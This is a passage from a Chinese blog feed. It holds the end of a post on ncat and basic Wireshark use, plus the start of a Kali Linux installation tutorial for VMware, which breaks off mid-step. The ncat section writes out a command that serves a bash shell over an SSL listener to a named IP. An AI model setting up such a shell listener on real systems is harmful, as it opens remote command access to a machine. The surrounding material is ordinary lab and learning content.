title="NC——NCAT"></a>NC——NCAT</h2><ul><li>Nc缺乏加密和身份验证的能力。</li><li>Ncat包含于nmap工具包中<br>使用方法<br>依旧是A和B两台机器实验<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A: ncat <span class="literal">-c</span> bash <span class="literal">-allow</span> <span class="number">192.168</span>.<span class="number">20.14</span> <span class="literal">-vnl</span> <span class="number">333</span> <span class="literal">-ssl</span></span><br><span class="line">B: ncat <span class="literal">-nv</span> <span class="number">1.1</span>.<span class="number">1.1</span> <span class="number">333</span> <span class="literal">-ssl</span></span><br></pre></td></tr></table></figure>参数说明：<br>A：首先ncat需要给出一个bash(本地shell)，然后<code>-allow</code>允许，后面加一个IP地址，是服务器端只允许指定的IP访问或连接。并且侦听一个端口333<br>B：直接连接就行<br>连接成功后服务器端会显示<code>Ncat：Connection from [ip] [port]</code><br>其实过程中两台主机已经进行了SSL证书验证和指纹识别。<br>这个时候使用无论输入什么命令或者传输什么信息，都是经过加密的。这里两台主机传输信息的管道就是加密的。<br>SSL加密有一定的安全性保障，每次使用，它的指纹信息都是重新生成的。<br>不同系统/平台的nc参数功能不一定相同。比如Ubuntu的和kali的就不一样。<h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1>这个工具应该都了解，渗透工具排行榜第一。(突然想到了小说)<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3>打开后回看到这样的(windows系统中)<br><img src="https://img-blog.csdnimg.cn/20200526082306698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>选择一个进行扑捉流量数据，抓包的时候选择具体要抓哪个网卡的数据包。<br>如果这样还找不到自己想抓的包是哪个的话，就将鼠标移动到过滤器上，就能看到它的IP。<h3 id="抓包-停止抓包"><a href="#抓包-停止抓包" class="headerlink" title="抓包/停止抓包"></a>抓包/停止抓包</h3>kali当中的wireshark<br><img src="https://img-blog.csdnimg.cn/20200526083301678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>emmmm刚打开可能会需要输入密码，将kali的用户密码输进去就行了。(我用的是普通用户登录)可能root用户不用，看情况自定。<br>上图中箭头指的地方就是以太网。双击即可进行抓包。<br><img src="https://img-blog.csdnimg.cn/20200526083550211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>点击这里停止抓包。<br>下一步，点击这里会出现可以选择的只抓取哪个特定的端口或服务。<br><img src="https://img-blog.csdnimg.cn/20200526084256402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><h3 id="筛选抓取服务"><a href="#筛选抓取服务" class="headerlink" title="筛选抓取服务"></a>筛选抓取服务</h3>比如只抓80端口的数据。<br>还可以输入指定IP来抓取数据包。<br><img src="https://img-blog.csdnimg.cn/20200526085130481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><h3 id="首选项设置"><a href="#首选项设置" class="headerlink" title="首选项设置"></a>首选项设置</h3><img src="https://img-blog.csdnimg.cn/20200526111625759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>不过我不想设置，懒。整那么多花里胡哨的做什么。<h2 id="Wireshark——筛选器"><a href="#Wireshark——筛选器" class="headerlink" title="Wireshark——筛选器"></a>Wireshark——筛选器</h2></li><li>过滤掉干扰的数据包</li><li>抓包筛选器</li><li>显示筛选器<br>筛选IP<br><img src="https://img-blog.csdnimg.cn/20200526130240579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>就可以筛选目标IP的数据包。只看IP为目标IP的数据。<h2 id="Wireshark——常见协议包"><a href="#Wireshark——常见协议包" class="headerlink" title="Wireshark——常见协议包"></a>Wireshark——常见协议包</h2></li><li>数据包的分层结构</li><li>Arp</li><li>lcmp</li><li>TCP——三次握手</li><li>UDP</li><li>DNS</li><li>http</li><li>FTP<h2 id="Wireshark——信息统计"><a href="#Wireshark——信息统计" class="headerlink" title="Wireshark——信息统计"></a>Wireshark——信息统计</h2></li><li>节点数</li><li>协议分布</li><li>包大小分布</li><li>会话连接</li><li>解码方式</li></ul><p>这些功能基本都在统计里面,没有汉化的版本，名字叫Statistics<br><img src="https://img-blog.csdnimg.cn/20200526163439161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><ul><li>捕获文件属性（Summary）<br><img src="https://img-blog.csdnimg.cn/2020052616452820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可以看到捕捉的接口，还有一共抓了多少包，包的大小等等一系列信息。</li><li>通过端点(Endpoints)<br><img src="https://img-blog.csdnimg.cn/20200526165118298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>查看ipv4，或者TCP和UDP的信息，可以看出一共是几个IP地址在通信。<br>通过点击Bytes可以按照字节数进行排序<br><img src="https://img-blog.csdnimg.cn/20200526165531899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>查找信息更加方便。可以查看哪些IP地址接收或者发送的数据包是最多的，以便了解到当前网络的数据包的发送与接收的情况。</li><li>协议分级<br><img src="https://img-blog.csdnimg.cn/20200526170010744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可以看出当前为止我抓的数据包都是什么协议的，哪些协议占的比例多，一目了然。</li><li>分组长度<br><img src="https://img-blog.csdnimg.cn/20200526170336925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>通过统计包的长度可以看出当前抓取的数据包是打包居多还是小包居多。<br>小包较多或者说大量的小包可能会造成网络的性能不好，还有很多攻击类型会使用小包来攻击，很有可能意味着某种攻击正在发生。</li><li>会话<br><img src="https://img-blog.csdnimg.cn/20200526170659618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>哪两个IP在进行对话，在这里可以看到，并且还有发包和接收包的大小，是A发送给B还是B发送给A都可以清楚的看到。</li><li>解码方式<br><img src="https://img-blog.csdnimg.cn/20200526171925695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>在应当进行解码的位置，右键单击，找到解码为，然后就可以解码为其他的协议。<br>点击这里进行选择更改<br><img src="https://img-blog.csdnimg.cn/20200526172207900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>wireshark的初步学习到此，以后慢慢实践。<br>文末寄语：</li></ul><blockquote><p>我们知道他们在演戏，他们也知道自己在演戏，他们也知道我们知道他们在演戏，我们也知道他们知道我们知道他们在演戏。——佚名</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali linux在虚拟机中安装教程(2020最新)+Owasp靶机搭建+vmware虚拟机出现的一些问题</title>
      <link href="/2020/08/23/kali%20linux%20%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%87%8C%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%EF%BC%882020%E6%9C%80%E6%96%B0%EF%BC%89+OWASP%E9%9D%B6%E6%9C%BA%E6%90%AD%E5%BB%BA+VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%87%BA%E7%8E%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"/>
      <url>/2020/08/23/kali%20linux%20%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%87%8C%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%EF%BC%882020%E6%9C%80%E6%96%B0%EF%BC%89+OWASP%E9%9D%B6%E6%9C%BA%E6%90%AD%E5%BB%BA+VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%87%BA%E7%8E%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>至于这些是什么就不多说了，来找教程的，肯定也清楚它们是什么，安装就跟着我的步骤一步一步来，我会尽量每一步都写到。</p><h2 id="声明：如果到有坑的地方，我会尽量标的明显一点。请仔细看教程，因为我就因为没有仔细看教程而踩坑了，然后就是，因为网上的各大博客网站我都看过了，都是相对于现在的官网更新的kali有些许出入。请仔细看教程，望少踩坑！！！"><a href="#声明：如果到有坑的地方，我会尽量标的明显一点。请仔细看教程，因为我就因为没有仔细看教程而踩坑了，然后就是，因为网上的各大博客网站我都看过了，都是相对于现在的官网更新的kali有些许出入。请仔细看教程，望少踩坑！！！" class="headerlink" title="声明：如果到有坑的地方，我会尽量标的明显一点。请仔细看教程，因为我就因为没有仔细看教程而踩坑了，然后就是，因为网上的各大博客网站我都看过了，都是相对于现在的官网更新的kali有些许出入。请仔细看教程，望少踩坑！！！"></a>声明：如果到有坑的地方，我会尽量标的明显一点。请仔细看教程，因为我就因为没有仔细看教程而踩坑了，然后就是，因为网上的各大博客网站我都看过了，都是相对于现在的官网更新的kali有些许出入。请仔细看教程，望少踩坑！！！</h2><p>搭建环境：VMware  workstation 15.5 pro ;Windows（搭建虚拟机的应该用的都是win10.）<br>**<em>kali**</em><br>镜像直接官网下载就行，下载地址如下：<br>kali:<a href="https://www.kali.org/">kali官网</a><br><img src="https://img-blog.csdnimg.cn/2020031921212189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>按照图里的红框进入到download界面<br><img src="https://img-blog.csdnimg.cn/20200319213003995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>根据你的配置选择，我的是win10,64位，所以就选第一个。点红框圈住的那个地方（因为可能官网更新，其他博主的教程这里就不是这么点的了）。等待下载<br>下载完成。（可能呢过程有点慢。）<br>打开虚拟机，点击创建新的虚拟机</p><p><img src="https://img-blog.csdnimg.cn/20200319213551808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>选择自定义，点下一步<br><img src="https://img-blog.csdnimg.cn/20200319213744231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后直接点下一步<br><img src="https://img-blog.csdnimg.cn/20200319213825136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>点稍后安装操作系统，下一步<br><img src="https://img-blog.csdnimg.cn/20200319213945338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>操作系统选择Linux，版本默认Ubuntu，点下一步<br><img src="https://img-blog.csdnimg.cn/20200319214048817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>处理器数量设置为2（当然也可以更大），不能更小，否则不保证不会出错，尽量跟我的设置一样，下一步<img src="https://img-blog.csdnimg.cn/2020031922143682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><strong>注意</strong>：内存要4G，不能少。否则会出错，我踩过这个坑。可以通过左边的那个条来快速设置。下一步<br><img src="https://img-blog.csdnimg.cn/20200319221653178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>选 ：使用网络地址转换，下一步<br><img src="https://img-blog.csdnimg.cn/20200319222110383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>选择推荐的，，下一步<br><img src="https://img-blog.csdnimg.cn/20200319222229544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 选推荐的那个，下一步<br> <img src="https://img-blog.csdnimg.cn/20200319222503963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 选：创建新虚拟磁盘， 下一步<br> <img src="https://img-blog.csdnimg.cn/20200319222550922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 这里的三个箭头所指的全选上（按照我的来就可以），下一步<br> <img src="https://img-blog.csdnimg.cn/20200319222747762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 通过浏览可以改路径，最好在专属于虚拟机的磁盘里弄一个文件夹。（这个没有那么严格，可以自己随意）<br><img src="https://img-blog.csdnimg.cn/20200319223048482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 这里要注意了，我做的时候没有仔细看教程。<br> 一定要注意，点自定义硬件<br> <img src="https://img-blog.csdnimg.cn/20200319224415230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 按照步骤进行，选择你下载镜像的位置。然后关闭<br> <img src="https://img-blog.csdnimg.cn/20200319224743955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 然后关闭之后点击完成，会开始创建虚拟机<br>创建完成， 对比一下是否有错。<br> <img src="https://img-blog.csdnimg.cn/20200319225031329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 还没完，下一步，开机<img src="https://img-blog.csdnimg.cn/20200319230005700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 选第一个。鼠标点进去虚拟机里敲回车就可以选择<br> 然后是这样的<br> <img src="https://img-blog.csdnimg.cn/20200319230130461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 语言选中文（简体），然后continue<br> <img src="https://img-blog.csdnimg.cn/20200319230308175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 选择中国，继续<br> <img src="https://img-blog.csdnimg.cn/20200319230416287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 配置键盘选择美式英语，继续<br> <img src="https://img-blog.csdnimg.cn/20200319230523880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 出现这个。等待<br> <img src="https://img-blog.csdnimg.cn/20200319230608280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 主机名就kali就行了，继续<br> <img src="https://img-blog.csdnimg.cn/20200319230659301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 域名没有可以不填，直接点继续<br> <img src="https://img-blog.csdnimg.cn/20200319230803558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 新的用户名，自己随意填写， 继续<br> <img src="https://img-blog.csdnimg.cn/20200319230858163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 自行设置密码，继续<img src="https://img-blog.csdnimg.cn/20200319231132602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 使用整个磁盘，继续<br> <img src="https://img-blog.csdnimg.cn/20200319231231667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br> 选择这个唯一的选项，继续<img src="https://img-blog.csdnimg.cn/20200319231321987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>选推荐新手使用的，继续<br><img src="https://img-blog.csdnimg.cn/20200319231437593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>选择<code>结束分区设定并将修改写入磁盘</code>，继续<br><img src="https://img-blog.csdnimg.cn/20200319231511378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>选择是，继续<br><img src="https://img-blog.csdnimg.cn/20200319231654204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>出现这个页面，等待<br><img src="https://img-blog.csdnimg.cn/20200319231739565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>直接点继续<br><img src="https://img-blog.csdnimg.cn/20200319231815252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>继续等待，<br><img src="https://img-blog.csdnimg.cn/20200319231946961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后一步按照提示操作，那张图我丢了。<br>再继续，就是<img src="https://img-blog.csdnimg.cn/20200319232351123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>还是等，过一段时间会出现这个，他说可以跳过这一步，别信他的!!听我的，点继续，<br><img src="https://img-blog.csdnimg.cn/20200319232425176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后就会出现那个整个安装步骤的界面，他让跳过这一步，别管其他的，直接点继续，还执行这一步“选择并安装软件”，别跳，千万别跳，我跳了两次，结果呢就是<br>正常完成，但是登陆的时候没有画面，是这样的<br><img src="https://img-blog.csdnimg.cn/2020031923304819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这样不是我们想要的结果<br>所以还继续执行那个错了的那一步。相信我，那坑我都踩过了，所以我敢这么说。<br>然后再继续等。出现这样的界面<br><img src="https://img-blog.csdnimg.cn/2020031923332035.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我也是个小白，什么都不懂，所以我就随便选择了一个，建议跟我选一样的吧，因为其他的我不知，也不能说保证能弄出来，这个我是自己搞过的，可以得到我们想要的结果。点继续<br><img src="https://img-blog.csdnimg.cn/2020031923355117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这次下载的东西有点多，建议WiFi下载，因为我连的是手机热点，用了我1.7个G的流量，慎重选择。我挺心疼的。，这个期间需要等待，等待，再等待……<br>然后出现了这个，，，，<br><img src="https://img-blog.csdnimg.cn/20200319233857238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>不要理他，还是选择继续执行这一步，不要跳，千万别跳。还是这个步骤，接着来，直到搞出来为止（这个不用担心还是重头来的问题，因为你上一步执行这个的时候下载的那些文件，不用重新下载明只是加载一下，而且很快，不会重新下载，也不费流量，也不会费时间。完全可以放心）</p><p><img src="https://img-blog.csdnimg.cn/20200319234001475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打一剂定心针，我的到这里了，就要完了的时候，他又给我报错，还让我跳。我就不跳，又来一遍，</p><p><img src="https://img-blog.csdnimg.cn/20200319234117259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后就完了，<img src="https://img-blog.csdnimg.cn/20200319234611837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这里就会快多了，<br>等待过程再放一张过程图，胜利就在前方。坚持啊！<br><img src="https://img-blog.csdnimg.cn/20200319234716801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>OK了，终于到这一步了，选择是，点击继续<br><img src="https://img-blog.csdnimg.cn/20200319234750153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>选择/dev/sda.    ，，，点击继续</p><p><img 